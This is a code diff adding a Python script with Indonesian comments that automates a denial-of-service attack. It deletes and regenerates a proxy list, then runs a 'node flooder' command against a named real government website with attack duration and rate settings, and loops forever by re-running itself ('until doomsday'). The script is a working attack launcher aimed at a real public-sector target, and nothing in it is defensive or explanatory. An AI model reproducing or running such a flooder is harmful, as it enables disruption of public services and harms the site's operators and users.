@@ -1,0 +1,54 @@
+#!/usr/bin/python3
+# encoding: utf-8
+# NICEDAY
+import requests, os, sys
+from re import findall as reg
+requests.packages.urllib3.disable_warnings()
+from threading import *
+from threading import Thread
+import time
+from datetime import datetime
+
+current_datetime = datetime.now()
+current_date_time = current_datetime.strftime("%m/%d/%Y | %H:%M:%S")
+
+# SERANGAN KE 1 DURASI 5 MENIT
+print("\x1b[0m" +"\033[42;1m" + "HAPUS PROXY LAMA" + "\x1b[0m")
+os.system('ls -all')
+time.sleep(5)
+os.system('clear')
+os.system('rm -rf proxy.txt')
+print("\x1b[0m" +"\033[42;1m" + "PROXY LAMA SUDAH DI HAPUS" + "\x1b[0m")
+os.system('ls -all')
+time.sleep(5)
+os.system('clear')
+print("\x1b[0m" +"\033[42;1m" + "BUAT PROXY BARU" + "\x1b[0m")
+time.sleep(5)
+os.system('python3 proxy.py')
+os.system('clear')
+time.sleep(2)
+print("\x1b[0m" +"\033[42;1m" + "PROXY BARU JADI" + "\x1b[0m")
+os.system('ls -all')
+time.sleep(5)
+os.system('clear')
+print("\x1b[0m" +"\033[42;1m" + "SAATNYA NGEGASSSSS" + "\x1b[0m")
+time.sleep(5)
+print("\x1b[0m" +"\033[32;1m" + current_date_time + "\x1b[0m")
+time.sleep(3)
+os.system('node flooder https://kayumaluepajeko.palukota.go.id 900 20 500 proxy.txt')
+print ("\x1b[0m" +"\033[42;1m" '''
++--------------------------+
+|  PROSES NGEGASS SELESAI  |
++--------------------------+
+''' "\x1b[0m")
+time.sleep(10)
+os.system('clear')
+
+
+# MENGULANG DARI AWAL 
+print("\x1b[0m" +"\033[42;1m" + "SAATNYA MENGULANG SAMPE KIAMAT" + "\x1b[0m")
+time.sleep(5)
+os.system('reset')
+os.system('clear')
+os.system('python3 gas.py')
+
